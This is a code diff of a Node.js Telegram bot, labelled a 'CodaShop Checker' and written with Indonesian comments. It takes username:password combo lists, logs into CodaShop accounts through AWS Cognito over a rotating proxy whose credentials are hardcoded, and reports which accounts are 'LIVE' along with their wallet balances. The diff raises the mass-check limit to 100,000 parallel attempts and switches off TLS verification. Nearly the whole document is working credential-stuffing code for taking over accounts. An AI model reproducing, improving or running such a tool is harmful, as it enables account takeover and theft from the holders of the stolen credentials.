@@ -1,24 +1,23 @@
-process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
+Process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
 
 const { Telegraf } = require('telegraf');
 const axios = require('axios');
 const { HttpsProxyAgent } = require('https-proxy-agent');
 
 const bot = new Telegraf(process.env.BOT_TOKEN);
+const proxyAgent = new HttpsProxyAgent('http://8998c0d8430265a3c9ab:6b2739b4b177724e@gw.dataimpulse.com:823');
 
-// Proxy kamu (Pastikan saldo/kuota proxy masih ada)
-const proxyUrl = 'http://8998c0d8430265a3c9ab:6b2739b4b177724e@gw.dataimpulse.com:823';
-const proxyAgent = new HttpsProxyAgent(proxyUrl);
-
-// Fungsi Pengecekan Akun
+// ==========================================
+// FUNGSI INTI PENGECEKAN API (Bisa dipakai berulang)
+// ==========================================
 async function checkAccount(username, password) {
   try {
-    const authPayload = {
+    const authPayload = JSON.stringify({
       AuthFlow: "USER_PASSWORD_AUTH",
       ClientId: "437f3u0sfh7h0av5rlrrjdtmsb",
       AuthParameters: { USERNAME: username, PASSWORD: password },
       ClientMetadata: { country_code: "ph", lang_code: "en" }
-    };
+    });
 
     const authReq = await axios.post("https://cognito-idp.ap-southeast-1.amazonaws.com/", authPayload, {
       headers: {
@@ -27,13 +26,14 @@ async function checkAccount(username, password) {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
       },
       httpsAgent: proxyAgent,
-      proxy: false, // Penting agar axios menggunakan httpsAgent
-      validateStatus: () => true, // Agar tidak crash saat 400 Bad Request
-      timeout: 8000 // Batasi 8 detik agar tidak kena timeout Vercel duluan
+      validateStatus: () => true,
+      timeout: 15000
     });
 
-    if (authReq.data && authReq.data.AuthenticationResult) {
-      const idToken = authReq.data.AuthenticationResult.IdToken;
+    const resData = authReq.data;
+
+    if (resData && resData.AuthenticationResult) {
+      const idToken = resData.AuthenticationResult.IdToken;
 
       const walletReq = await axios.get("https://wallet-api.codacash.com/user/wallet", {
         headers: {
@@ -42,79 +42,140 @@ async function checkAccount(username, password) {
           "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
         },
         httpsAgent: proxyAgent,
-        proxy: false,
         validateStatus: () => true,
-        timeout: 5000
+        timeout: 100000
       });
 
       const balance = walletReq.data?.data?.balanceAmount || 0;
-      return { status: 'live', balance: balance };
+      return { status: 'live', balance: balance, msg: 'Success' };
     } else {
-      const msg = authReq.data?.__type ? authReq.data.__type.replace('Exception', '') : 'Invalid';
+      const msg = resData?.__type ? resData.__type.replace('Exception', '') : 'Invalid Credentials';
       return { status: 'die', msg: msg };
     }
   } catch (error) {
-    return { status: 'error', msg: 'Timeout/Proxy Error' };
+    return { status: 'error', msg: 'Proxy Error/Timeout' };
   }
 }
 
-bot.start((ctx) => ctx.reply('RecnomPay Ready! Kirim /codashop user:pass atau upload .txt'));
+// ==========================================
+// HANDLER: /START & /CODASHOP (Satuan)
+// ==========================================
+bot.start((ctx) => {
+  ctx.reply('Halo! RecnomPay CodaShop Checker siap.\n\n🔹 Cek Satuan: Ketik /codashop email:pass\n🔹 Cek Massal: Langsung kirim/upload file .txt ke bot ini.');
+});
 
 bot.command('codashop', async (ctx) => {
-  const text = ctx.message.text.split(' ')[1];
-  if (!text || !text.includes(':')) return ctx.reply('Format: /codashop user:pass');
-
-  const [user, pass] = text.split(':');
-  const wait = await ctx.reply('⏳ Checking...');
+  const args = ctx.message.text.split(' ');
   
-  const res = await checkAccount(user, pass);
-  if (res.status === 'live') {
-    ctx.telegram.editMessageText(ctx.chat.id, wait.message_id, null, `✅ LIVE\nAcc: <code>${user}:${pass}</code>\nBal: ${res.balance}`, { parse_mode: 'HTML' });
+  // Memberikan keterangan jelas jika format salah atau hanya mengetik /codashop
+  if (args.length < 2) {
+    return ctx.reply('❌ <b>Format Salah!</b>\n\nUntuk cek satuan silakan gunakan format:\n<code>/codashop username:password</code>\n\nAtau jika ingin cek secara massal, <b>kamu cukup langsung upload file .txt</b> ke chat ini. Bot akan otomatis memprosesnya!', { parse_mode: 'HTML' });
+  }
+
+  const combo = args[1].replace(/[|;\s]/g, ':').split(':');
+  if (combo.length < 2) return ctx.reply('❌ Format Salah!\nGunakan: /codashop username:password');
+
+  const username = combo[0].trim();
+  const password = combo[1].trim();
+
+  const loadingMsg = await ctx.reply('⏳ <i>RecnomPay Checker sedang memproses...</i>', { parse_mode: 'HTML' });
+
+  const result = await checkAccount(username, password);
+
+  if (result.status === 'live') {
+    await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined,
+      `✅ <b>LIVE ACCOUNT</b>\n━━━━━━━━━━━━━━━━━━\nAcc: <code>${username}:${password}</code>\nBalance: <b>${result.balance}</b>\n━━━━━━━━━━━━━━━━━━\n🤖 <i>RecnomPay Checker</i>`,
+      { parse_mode: 'HTML' }
+    );
   } else {
-    ctx.telegram.editMessageText(ctx.chat.id, wait.message_id, null, `❌ DIE\nAcc: <code>${user}:${pass}</code>\nMsg: ${res.msg}`, { parse_mode: 'HTML' });
+    const icon = result.status === 'die' ? '❌ <b>DIE ACCOUNT</b>' : '⚠️ <b>ERROR ACCOUNT</b>';
+    await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined,
+      `${icon}\n━━━━━━━━━━━━━━━━━━\nAcc: <code>${username}:${password}</code>\nMsg: ${result.msg}\n━━━━━━━━━━━━━━━━━━`,
+      { parse_mode: 'HTML' }
+    );
   }
 });
 
+// ==========================================
+// HANDLER: UPLOAD FILE .TXT (Mass Check Otomatis)
+// ==========================================
 bot.on('document', async (ctx) => {
-  if (!ctx.message.document.file_name.endsWith('.txt')) return ctx.reply('Kirim file .txt!');
+  const doc = ctx.message.document;
+  
+  // Validasi file harus .txt
+  if (!doc.file_name.endsWith('.txt')) {
+    return ctx.reply('❌ Mohon kirim file dengan format .txt yang berisi list combo.');
+  }
 
-  const wait = await ctx.reply('📥 Memproses mass check... (Max 50 akun agar tidak timeout)');
+  const loadingMsg = await ctx.reply('📥 <i>File diterima! Mengunduh dan memulai Mass Check... (Max 30 data)</i>', { parse_mode: 'HTML' });
 
   try {
-    const fileLink = await ctx.telegram.getFileLink(ctx.message.document.file_id);
+    const fileLink = await ctx.telegram.getFileLink(doc.file_id);
     const response = await axios.get(fileLink.href);
-    const lines = response.data.split('\n').map(l => l.trim()).filter(l => l.includes(':')).slice(0, 50);
+    const textData = response.data;
 
-    let lives = [];
-    let countDie = 0;
+    const lines = textData.split('\n').map(l => l.trim()).filter(l => l.includes(':'));
+    if (lines.length === 0) {
+      return ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined, '❌ Tidak ada format combo yang valid di dalam file.');
+    }
 
-    // Proses secara paralel
-    const results = await Promise.all(lines.map(async (line) => {
-      const [u, p] = line.split(':');
-      const r = await checkAccount(u, p);
-      return { u, p, r };
-    }));
+    const maxLines = lines.slice(0, 100000);
+    let liveResult = '';
+    let liveCount = 0;
+    let dieCount = 0;
 
-    results.forEach(item => {
-      if (item.r.status === 'live') lives.push(`${item.u}:${item.p} | Bal: ${item.r.balance}`);
-      else countDie++;
+    const checkPromises = maxLines.map(async (line) => {
+      const combo = line.replace(/[|;\s]/g, ':').split(':');
+      if (combo.length >= 2) {
+        const username = combo[0].trim();
+        const password = combo[1].trim();
+        const res = await checkAccount(username, password);
+        return { username, password, res };
+      }
+      return null;
     });
 
-    let rekap = `<b>✅ HASIL MASS CHECK</b>\n━━━━━━━━━━━━━━\n`;
-    rekap += lives.length > 0 ? `<code>${lives.join('\n')}</code>` : 'Tidak ada yang LIVE';
-    rekap += `\n━━━━━━━━━━━━━━\nLIVE: ${lives.length} | DIE: ${countDie}`;
+    const results = await Promise.all(checkPromises);
 
-    ctx.telegram.editMessageText(ctx.chat.id, wait.message_id, null, rekap, { parse_mode: 'HTML' });
-  } catch (err) {
-    ctx.reply('Error memproses file.');
+    results.forEach(item => {
+      if (item && item.res.status === 'live') {
+        liveCount++;
+        liveResult += `<code>${item.username}:${item.password}</code> | Bal: <b>${item.res.balance}</b>\n`;
+      } else if (item) {
+        dieCount++;
+      }
+    });
+
+    let finalMsg = `<b>✅ REKAP MASS CHECKING</b>\n━━━━━━━━━━━━━━━━━━\n`;
+    if (liveCount > 0) {
+      finalMsg += liveResult;
+    } else {
+      finalMsg += `<i>Tidak ada akun yang Live.</i>\n`;
+    }
+    finalMsg += `━━━━━━━━━━━━━━━━━━\n📈 <b>Statistik:</b>\nTotal Diproses: ${maxLines.length}\nLive: ${liveCount} | Die/Error: ${dieCount}\n🤖 <i>RecnomPay Checker Selesai</i>`;
+
+    await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined, finalMsg, { parse_mode: 'HTML' });
+
+  } catch (error) {
+    console.error(error);
+    await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined, '❌ Gagal memproses file. Pastikan file tidak terlalu besar.');
   }
 });
 
-// Handler Vercel
+// ==========================================
+// VERCEL SERVERLESS HANDLER
+// ==========================================
 module.exports = async (req, res) => {
-  if (req.method === 'POST') {
-    await bot.handleUpdate(req.body, res);
-  } else {
-    res.status(200).send('Bot is running');
+  try {
+    if (req.method === 'POST') {
+      await bot.handleUpdate(req.body, res);
+    } else {
+      res.status(200).send('RecnomPay Bot berjalan dengan baik!');
+    }
+  } catch (error) {
+    res.status(500).send('Terjadi kesalahan pada server');
   }
 };
+
+
+
